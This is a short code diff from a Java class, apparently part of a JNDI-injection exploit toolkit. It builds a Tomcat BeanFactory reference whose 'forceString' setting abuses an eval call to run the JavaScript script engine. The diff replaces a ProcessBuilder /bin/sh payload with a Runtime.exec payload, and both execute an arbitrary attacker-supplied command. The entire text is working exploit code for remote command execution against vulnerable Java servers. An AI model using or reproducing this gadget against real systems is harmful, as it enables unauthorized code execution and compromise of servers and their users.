@@ -29,14 +29,11 @@ public class TomcatRefBullet extends Bullet<Reference> {
                 null, "", "",
                 true,"org.apache.naming.factory.BeanFactory",
                 null);
-
         ref.add(new StringRefAddr("forceString", "KINGX=eval"));
         ref.add(new StringRefAddr("KINGX",
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                         ".newInstance().getEngineByName(\"JavaScript\")" +
-                        ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](" +
-                        "['/bin/sh','-c','"+ command +"'])" +
-                        ".start()\")"));
+                        ".eval(\"java.lang.Runtime.getRuntime().exec('"+command+"')\")"));
         return ref;
     }
 }
